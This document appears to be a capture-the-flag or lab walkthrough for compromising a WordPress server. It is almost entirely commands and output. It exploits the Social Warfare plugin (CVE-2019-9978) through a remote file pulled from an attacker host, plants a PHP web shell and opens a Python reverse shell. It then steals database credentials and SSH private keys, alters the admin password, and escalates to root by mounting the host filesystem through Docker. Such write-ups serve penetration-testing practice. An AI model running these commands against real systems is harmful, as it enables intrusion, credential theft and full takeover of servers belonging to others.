### Initial Recon

```
# Web app at http://10.10.10.35
# WordPress detected by wpscan
wpscan --url http://10.10.10.35 --enumerate u,vp,vt

# Enumerated users:
# admin, editor, subscriber

# Vulnerable plugins found:
# social-warfare 3.5.2 (RCE)
```

#### Exploit Social Warfare
```
# CVE-2019-9978 - RCE in Social Warfare
curl "http://10.10.10.35/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://10.10.14.5:8000/shell.txt"

# Shell.txt contains:
# <?php system($_GET['cmd']); ?>

# Test RCE
curl "http://10.10.10.35/wp-content/uploads/2019/10/shell.txt?cmd=whoami"
# www-data

# Get reverse shell
curl "http://10.10.10.35/wp-content/uploads/2019/10/shell.txt?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
```

#### Enumerate WordPress
```
# Find wp-config.php
find /var/www -name wp-config.php 2>/dev/null
# /var/www/html/wp-config.php

# Grab database creds
cat /var/www/html/wp-config.php | grep DB
# define('DB_NAME', 'wordpress');
# define('DB_USER', 'wpuser');
# define('DB_PASSWORD', 'StrongDBPass123!');
# define('DB_HOST', 'localhost');

# MySQL access
mysql -u wpuser -pStrongDBPass123!

# Dump admin hash
SELECT user_login, user_pass FROM wp_users;
# admin:$P$B1234567890abcdefghijklmnopqrstuv

# Change admin password (optional)
UPDATE wp_users SET user_pass = MD5('newpassword') WHERE user_login = 'admin';
```

#### SSH Access
```
# Check for SSH keys in home directories
ls -la /home/*/.ssh/
# /home/admin/.ssh/id_rsa

# Read private key
cat /home/admin/.ssh/id_rsa

# SSH as admin
chmod 600 admin_key
ssh -i admin_key admin@10.10.10.35
```

#### Docker Escape to Root
```
# Check Docker
groups
# admin docker

# List containers
docker ps
# CONTAINER ID   IMAGE     COMMAND   STATUS
# 3f2a1b4c5d6e   ubuntu    bash      Up 2 days

# Mount host filesystem
docker run -it -v /:/host ubuntu:latest /bin/bash

# Inside container, access host files
cat /host/etc/shadow

# Get root hash
cat /host/root/.ssh/id_rsa

# SSH as root to host
ssh -i root_key root@10.10.10.35
```

